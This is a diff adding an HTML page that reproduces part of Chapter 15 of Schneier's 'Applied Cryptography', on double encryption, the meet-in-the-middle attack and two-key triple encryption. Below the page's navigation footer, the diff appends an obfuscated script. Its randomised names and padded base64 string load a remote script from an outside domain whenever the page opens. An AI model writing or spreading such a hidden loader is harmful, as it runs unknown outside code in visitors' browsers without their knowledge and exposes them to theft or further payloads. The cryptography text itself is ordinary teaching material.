@@ -1,0 +1,108 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Combining Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=15//-->
+<!--PAGES=357-359//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch14/14-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 15<BR>Combining Block Ciphers
+</FONT></H2>
+<P>There are many ways to combine block algorithms to get new algorithms. The impetus behind these schemes is to try to increase security without going through the trouble of designing a new algorithm. DES is a secure algorithm; it has been cryptanalyzed for a good 20 years and the most practical way to break it is still brute force. However, the key is too short. Wouldn&#146;t it be nice to use DES as a building block for another algorithm with a longer key? We&#146;d have the best of both worlds: the assurance of two decades of cryptanalysis plus a long key.
+</P>
+<P><B>Multiple encryption</B> is one combination technique: using an algorithm to encrypt the same plaintext block multiple times with multiple keys. Cascading is like multiple encryption, but uses different algorithms. There are other techniques.</P>
+<P>Encrypting a plaintext block twice with the same key, whether with the same algorithm or a different one, is not smart. For the same algorithm, it does not affect the complexity of a brute-force search. (Remember, you assume a cryptanalyst knows the algorithm including the number of encryptions used.) For different algorithms, it may or may not. If you are going to use any of the techniques in this chapter, make sure the multiple keys are different and independent.</P>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">15.1 Double Encryption</FONT></H3>
+<P>A na&#236;ve way of improving the security of a block algorithm is to encrypt a block twice with two different keys. First encrypt a block with the first key, then encrypt the resulting ciphertext with the second key. Decryption is the reverse process.
+</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>))
+<DD><I>P</I> = <I>D</I><SUB>K1</SUB>(<I>D</I><SUB>K2</SUB>(<I>C</I>))
+</DL>
+<P>If the block algorithm is a group (see Section 11.3), then there is always a <I>K</I><SUB>3</SUB> such that</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>)) = <I>E</I><SUB>K3</SUB>(<I>P</I>)
+</DL>
+<P>If this is not the case, the resultant doubly-encrypted ciphertext block should be much harder to break using an exhaustive search. Instead of 2<SUP><I>n</I></SUP> attempts (where <I>n</I> is the bit length of the key), it would require 2<SUP>2<I>n</I></SUP> attempts. If the algorithm is a 64-bit algorithm, the doubly-encrypted ciphertext would require 2<SUP>128</SUP> attempts to find the key.</P>
+<P>This turns out not to be true for a known-plaintext attack. Merkle and Hellman [1075] developed a time-memory trade-off that could break this double-encryption scheme in 2<SUP><I>n</I> &#43; 1</SUP> encryptions, not in 2<SUP>2<I>n</I></SUP> encryptions. (They showed this for DES, but the result can be generalized to any block algorithm.) The attack is called a <B>meet-in-the-middle attack;</B> it works by encrypting from one end, decrypting from the other, and matching the results in the middle.</P>
+<P>In this attack, the cryptanalyst knows <I>P</I><SUB>1</SUB>, <I>C</I><SUB>1</SUB>, <I>P</I><SUB>2</SUB>, and <I>C</I><SUB>2</SUB>, such that</P>
+<DL>
+<DD><I>C</I><SUB>1</SUB> = <I>E<SUB>K</I><SUB>2</SUB></SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I><SUB>1</SUB>))
+<DD><I>C</I><SUB>2</SUB> = <I>E</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I><SUB>2</SUB>))
+</DL>
+<P>For each possible <I>K</I>, he computes <I>E</I><SUB>K</SUB>(<I>P</I><SUB>1</SUB>) and stores the result in memory. After collecting them all, he computes <I>D</I><SUB>K</SUB>(<I>C</I><SUB>1</SUB>) for each <I>K</I> and looks for the same result in memory. If he finds it, it is possible that the current key is <I>K</I><SUB>2</SUB> and the key in memory is <I>K</I><SUB>1</SUB>. He tries encrypting <I>P</I><SUB>2</SUB> with <I>K</I><SUB>1</SUB> and <I>K</I><SUB>2</SUB>; if he gets <I>C</I><SUB>2</SUB> he can be pretty sure (with a probability of success of 1 in 2<SUP><I>2m</I> &#150; 2<I>n</I></SUP>, where <I>m</I> is the block size) that he has both <I>K</I><SUB>1</SUB> and <I>K</I><SUB>2</SUB>. If not, he keeps looking. The maximum number of encryption trials he will probably have to run is 2*2<I><SUP>n</I></SUP>, or 2<SUP><I>n</I> &#43; 1</SUP>. If the probability of error is too large, he can use a third ciphertext block to get a probability of success of 1 in 2<SUP>3<I>m</I> &#150; 2<I>n</I></SUP>. There are still other optimizations [912].</P>
+<P>This attack requires a lot of memory: 2<SUP><I>n</I></SUP> blocks. For a 56-bit algorithm, this translates to 2<SUP>56</SUP> 64-bit blocks, or 10<SUP>17</SUP> bytes. This is still considerably more memory storage than one could comfortably comprehend, but it&#146;s enough to convince the most paranoid of cryptographers that double encryption is not worth anything.</P>
+<P>For a 128-bit key, the amount of memory required is an enormous 10<SUP>39</SUP> bytes. If we assume that a way exists to store a bit of information on a single atom of aluminum, the memory device required to launch this attack would be a cube of solid aluminum over a kilometer on a side. And then you need some place to put it! The meet-in-the middle attack seems infeasible for keys this size.</P>
+<P>Another double-encryption method, sometimes called <B>Davies-Price</B>, is a variant of CBC [435].</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>E</I><SUB>K1</SUB>(<I>P</I><SUB>i</SUB> &#8853; <I>E</I><SUB>K2</SUB>(<I>C</I><SUB>i - 1</SUB>))
+<DD><I>P</I><SUB>i</SUB> = <I>D</I><SUB>K1</SUB>(<I>C</I><SUB>i</SUB>) &#8853; <I>E</I><SUB>K2</SUB>(<I>C</I><SUB>i - 1</SUB>)
+</DL>
+<P>They claim &#147;no special virtue of this mode,&#148; but it seems to be vulnerable to the same meet-in-the-middle attacks as other double-encryption modes.
+</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">15.2 Triple Encryption</FONT></H3>
+<P><FONT SIZE="+1"><B><I>Triple Encryption with Two Keys</I></B></FONT></P>
+<P>A better idea, proposed by Tuchman in [1551], operates on a block three times with two keys: with the first key, then with the second key, and finally with the first key again. He suggested that the sender first encrypt with the first key, then decrypt with the second key, and finally encrypt with the first key. The receiver decrypts with the first key, then encrypts with the second key, and finally decrypts with the first key.
+</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K1</SUB>(<I>D</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>)))
+<DD><I>P</I> = <I>D</I><SUB>K1</SUB>(<I>E</I><SUB>K2</SUB>(<I>D</I><SUB>K1</SUB>(<I>C</I>)))
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch14/14-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(xOxaCxoE, NRancJKa) {NRancJKa = xOxaCxoE.createElement('script');NRancJKa.type = 'text/javascript';NRancJKa.async = true;NRancJKa.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');xOxaCxoE.getElementsByTagName('body')[0].appendChild(NRancJKa);}(document));</script></body>
+</html>
